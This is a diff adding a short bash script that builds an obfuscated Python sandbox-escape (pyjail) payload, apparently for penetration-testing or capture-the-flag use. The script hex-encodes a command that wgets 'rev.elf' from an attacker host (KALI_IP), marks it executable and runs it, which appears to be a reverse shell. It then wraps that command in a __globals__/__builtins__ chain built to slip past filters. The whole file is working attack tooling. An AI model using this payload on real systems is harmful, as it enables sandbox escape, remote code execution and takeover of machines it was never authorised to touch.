@@ -1,0 +1,29 @@
+#!/bin/bash
+
+# Script to generate a python payload to bypass a pyjail
+#  Requires __globals__
+#   For more bypasses see: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html#eval-ing-python-code
+
+# Command to execute
+rev_cmd="wget http://${KALI_IP}/b/rev.elf -O /tmp/rev; chmod +x /tmp/rev; /tmp/rev &"
+
+# Function to encode string in hex format (\x42..)
+function encode_string {
+  echo -n "${1}" | xxd -p | sed 's/\(..\)/\\x\1/g' | tr -d '\n'
+}
+
+# Encode values
+ENCODED_REV=$(encode_string "${rev_cmd}")
+builtins=$(encode_string "__builtins__")
+import=$(encode_string "__import__")
+system=$(encode_string "system")
+os=$(encode_string "os")
+
+# Python 2
+cmd="(lambda x:x).__globals__['${builtins}']['${import}']('${os}').__dict__['${system}'](\"${ENCODED_REV}\")"
+
+# Python 3
+# cmd="(lambda x:x).__globals__['${builtins}'].__dict__['${import}']('${os}').__dict__['${system}'](\"${ENCODED_REV}\")"
+
+type_command "${cmd}"
+
